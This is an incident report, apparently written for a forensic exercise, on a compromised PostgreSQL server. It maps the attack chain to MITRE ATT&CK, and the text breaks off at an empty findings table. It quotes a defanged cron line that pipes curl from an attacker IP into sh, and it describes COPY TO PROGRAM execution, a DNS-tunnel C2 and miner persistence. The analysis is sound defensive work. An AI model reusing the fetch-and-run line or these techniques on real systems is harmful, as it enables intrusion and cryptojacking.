[?2004l[?2004h> # Post-Compromise Intrusion Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> On 2026-08-23, host `postgres-prod-01` (`10.10.31.1` as per `/disk/etc/hosts:2`) was compromised by an external threat actor operating from IP `198.51.100.214` (`/disk/var/log/secure:214`). The attack exploited weak PostgreSQL superuser authentication (`/disk/var/lib/pgsql/data/pg_hba.conf:3`) and SSH password authentication (`/disk/var/log/secure:155-214`).
[?2004l[?2004h> 
[?2004l[?2004h> The threat actor executed shell commands via PostgreSQL's `COPY ... TO PROGRAM` feature (`/sas/cti/advisory.txt:13`), dropped a XMRig cryptocurrency miner / stager payload (`/disk/var/lib/pgsql/.local/pgdaemon:1`), established exfiltration over a DNS tunnel (`/disk/etc/pgdaemon.conf:3`), implemented dual persistence via cron (`/disk/var/spool/cron/postgres:5`) and systemd (`/disk/etc/systemd/system/pg-metrics.service:5`), and attempted anti-forensics by timestomping (`/disk/var/lib/pgsql/.local/.timestamps:2`) and log cache wiping (`/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Threat Actor & Attributed Entities
[?2004l[?2004h> - **External IP**: `198.51.100.214` (`/disk/var/log/secure:214`, `/sas/cti/advisory.txt:5`)
[?2004l[?2004h> - **DNS Tunnel Resolver / C2 Domain**: `update-postgres.example.cn` (`/disk/etc/pgdaemon.conf:3`, `/sas/cti/advisory.txt:20`)
[?2004l[?2004h> - **Mining Pool Address**: `stratum+tcp://xmr.postgres.evil:3333` (`/disk/var/lib/pgsql/.local/pgdaemon:4`, `/sas/cti/advisory.txt:21`)
[?2004l[?2004h> - **Monero Wallet Address**: `4A000000000000000000c5f08041507f` (`/disk/var/lib/pgsql/.local/pgdaemon:5`, `/sas/cti/advisory.txt:22`)
[?2004l[?2004h> - **Target Accounts**: `root`, `postgres` (`/disk/var/log/secure:214`, `/disk/var/spool/cron/postgres:5`)
[?2004l[?2004h> 
[?2004l[?2004h> ## Comprehensive Attack Chain (MITRE ATT&CK Mapping)
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1: Valid Accounts & Initial Access (T1078)
[?2004l[?2004h> - **Description**: The threat actor accessed the host via two vectors: PostgreSQL database access and SSH remote login. The database configuration in `pg_hba.conf` granted unauthenticated `trust` access to all remote IP addresses (`0.0.0.0/0`) for the PostgreSQL superuser (`/disk/var/lib/pgsql/data/pg_hba.conf:3`). Concurrently, SSH brute force attacks were conducted from `198.51.100.214` (`/disk/var/log/secure:155`), resulting in successful authentication as `root` (`/disk/var/log/secure:214`).
[?2004l[?2004h> - **Alert Status**: PARTIAL. Database configuration noted in `/sas/alerts.json:18` (ALERT-03 / CHK-06); SSH password brute force and successful root login were SILENT.
[?2004l[?2004h> - **Evidence Citation**: `/disk/var/lib/pgsql/data/pg_hba.conf:3`, `/disk/var/log/secure:214`, `/sas/cti/advisory.txt:12`.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 2: Execution via Unix Shell & COPY TO PROGRAM (T1059.004)
[?2004lnel (`/disk/[?2004h> - **Description**: Leveraging PostgreSQL superuser privileges, the actor issued SQL commands utilizing `COPY ... TO PROGRAM` (`/sas/cti/advisory.txt:13`) to execute shell commands as the `postgres` system user. This dropped the binary executable payload `/var/lib/pgsql/.local/pgdaemon` (`/disk/var/lib/pgsql/.local/pgdaemon:1`).
[?2004l[?2004h> - **Alert Status**: ALERTED in `/sas/alerts.json:1` (ALERT-01 / CHK-01).
[?2004l[?2004h> - **Evidence Citation**: `/disk/var/lib/pgsql/.local/pgdaemon:1`, `/sas/alerts.json:1`, `/sas/cti/advisory.txt:13`.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 3: Exfiltration Over Unencrypted Non-C2 Protocol / DNS Tunneling (T1048.003)
[?2004l[?2004h> - **Description**: The actor dropped a C2 and DNS tunneling configuration file at `/etc/pgdaemon.conf` (`/disk/etc/pgdaemon.conf:1-3`). The configuration routes exfiltrated database telemetry and local system data over DNS queries directed to `update-postgres.example.cn` (`/disk/etc/pgdaemon.conf:3`). Evidence of active beaconing was also recovered from wiped cache fragments (`/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> - **Alert Status**: SILENT (Not present in SAS alerts feed).
[?2004l[?2004h> - **Evidence Citation**: `/disk/etc/pgdaemon.conf:3`, `/disk/var/lib/.cache/.wiped.bin:1`, `/sas/cti/advisory.txt:14`.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 4: Execution & Persistence via Cron (T1053.003)
[?2004l[?2004h> - **Description**: The actor established cron persistence in the user cron table `/var/spool/cron/postgres` (`/disk/var/spool/cron/postgres:5`). The job runs a shell script execution payload (`* * * * * root <defanged beacon: curl hxxp://198.51.100.214/x | sh>`) designed to repeatedly fetch and re-drop cryptocurrency miner and daemon payloads (`xmrig`, `pgdaemon`, `php`, `redis`, `wget`).
[?2004l[?2004h> - **Alert Status**: ALERTED in `/sas/alerts.json:10` (ALERT-02 / CHK-02).
[?2004l[?2004h> - **Evidence Citation**: `/disk/var/spool/cron/postgres:5`, `/sas/alerts.json:10`, `/sas/cti/advisory.txt:15`.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 5: Systemd Service Persistence (T1543.002)
[?2004l[?2004h> - **Description**: The actor created a malicious systemd service unit file at `/etc/systemd/system/pg-metrics.service` (`/disk/etc/systemd/system/pg-metrics.service:1-7`) under the deceptive description `System Update Helper`. The unit executes an `ExecStart` command that re-launches `/var/lib/pgsql/.local/pgdaemon` upon boot and network activation.
[?2004l[?2004h> - **Note on Legitimate Job**: `/etc/systemd/system/pg-backup.service` (`/disk/etc/systemd/system/pg-backup.service:1-3`) was analyzed and confirmed to be a legitimate, approved operational backup job (`/usr/local/bin/backup.sh --remote 10.10.31`).
[?2004l[?2004h> - **Alert Status**: SILENT (Not present in SAS alerts feed).
[?2004l[?2004h> - **Evidence Citation**: `/disk/etc/systemd/system/pg-metrics.service:5`, `/disk/etc/systemd/system/pg-backup.service:1`, `/sas/cti/advisory.txt:16`.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 6: Anti-Forensics & Timestomping (T1070.006)
[?2004l[?2004h> - **Description**: The actor performed timestomping on dropped files under `/var/lib/pgsql/.local/` to backdate file modification times (`mtime`) to match standard system binaries such as `/bin/ls` (`/disk/var/lib/pgsql/.local/.timestamps:2`). Furthermore, log files and credential cache files were wiped or truncated (`/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> - **Alert Status**: SILENT (Not present in SAS alerts feed).
[?2004l[?2004h> - **Evidence Citation**: `/disk/var/lib/pgsql/.local/.timestamps:2`, `/disk/var/lib/.cache/.wiped.bin:1`, `/sas/cti/advisory.txt:17`.
[?2004l[?2004h> 
[?2004l[?2004h> ## Impact & Findings Summary Matrix
[?2004l[?2004h> | Finding ID | Artifact Path | ATT&CK Technique | Alert Status | Impact |
[?2004l[?2004h> |------------|---------------|------------------|--------------|--------|
